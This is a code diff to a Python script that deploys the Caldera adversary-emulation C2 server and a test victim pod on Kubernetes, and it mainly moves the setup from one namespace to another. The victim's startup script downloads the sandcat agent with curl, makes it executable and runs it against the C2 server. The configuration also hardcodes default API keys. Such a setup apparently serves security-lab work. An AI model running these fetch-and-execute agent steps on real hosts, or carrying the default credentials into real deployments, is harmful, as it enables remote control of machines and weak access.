@@ -7,10 +7,10 @@ import requests
 from kubernetes import client, config
 from kubernetes.client.exceptions import ApiException
 
-CALDERA_URL = os.environ.get("CALDERA_URL", "http://caldera.caldera.svc.cluster.local:8888")
+CALDERA_URL = os.environ.get("CALDERA_URL", "http://caldera.piap.svc.cluster.local:8888")
 API_KEY = os.environ.get("CALDERA_API_KEY", "ADMIN123")
-NAMESPACE = "caldera"
-NAMESPACE_OLD = "piap"  # legacy namespace — cleaned up on deploy
+NAMESPACE = "piap"
+NAMESPACE_OLD = "caldera"  # previous broken namespace — cleaned up on deploy
 
 
 def _core():
@@ -145,16 +145,7 @@ def deploy_caldera():
     core = _core()
     apps = _apps()
 
-    # ── 0. Ensure namespace exists; clean up stale piap-namespace resources ──
-    try:
-        core.create_namespace(client.V1Namespace(
-            metadata=client.V1ObjectMeta(name=NAMESPACE)
-        ))
-    except ApiException as e:
-        if e.status != 409:
-            raise
-
-    # Delete old caldera resources from piap namespace (frees nodePort 30600)
+    # ── 0. Clean up stale caldera-namespace resources (frees nodePort 30600) ──
     for name, fn in [
         ("caldera", apps.delete_namespaced_deployment),
         ("caldera-victim", apps.delete_namespaced_deployment),
@@ -177,8 +168,9 @@ def deploy_caldera():
     local_yml = (
         "host: 0.0.0.0\n"
         "port: 8888\n"
-        "app.contact.http: http://127.0.0.1:8888\n"
+        "app.contact.http: http://caldera.piap.svc.cluster.local:8888\n"
         "app.contact.html: /beacon\n"
+        "app.contact.websocket: 127.0.0.1:7012\n"
         "api_key_red: ADMIN123\n"
         "api_key_blue: BLUEADMIN123\n"
         "users:\n"
@@ -283,7 +275,7 @@ def deploy_caldera():
         "echo '[victim] Installing tools...'\n"
         "apt-get update -qq && apt-get install -y -qq curl wget iputils-ping netcat-openbsd 2>/dev/null || true\n\n"
         "echo '[victim] Waiting for Caldera C2 to be ready...'\n"
-        "until curl -sf --max-time 3 http://caldera.caldera.svc.cluster.local:8888 > /dev/null 2>&1; do\n"
+        "until curl -sf --max-time 3 http://caldera.piap.svc.cluster.local:8888 > /dev/null 2>&1; do\n"
         "  echo '[victim] Caldera not ready, retrying in 15s...'\n"
         "  sleep 15\n"
         "done\n\n"
@@ -291,11 +283,11 @@ def deploy_caldera():
         "curl -s -X POST \\\n"
         "  -H 'file:sandcat.go-linux' \\\n"
         "  -H 'platform:linux' \\\n"
-        "  http://caldera.caldera.svc.cluster.local:8888/file/download \\\n"
+        "  http://caldera.piap.svc.cluster.local:8888/file/download \\\n"
         "  -o /tmp/sandcat\n\n"
         "chmod +x /tmp/sandcat\n"
         "echo '[victim] Agent downloaded. Connecting to C2 (group: red)...'\n"
-        "/tmp/sandcat -server http://caldera.caldera.svc.cluster.local:8888 -group red -v\n"
+        "/tmp/sandcat -server http://caldera.piap.svc.cluster.local:8888 -group red -v\n"
     )
     cm_victim = client.V1ConfigMap(
         metadata=client.V1ObjectMeta(name="caldera-victim-script", namespace=NAMESPACE),
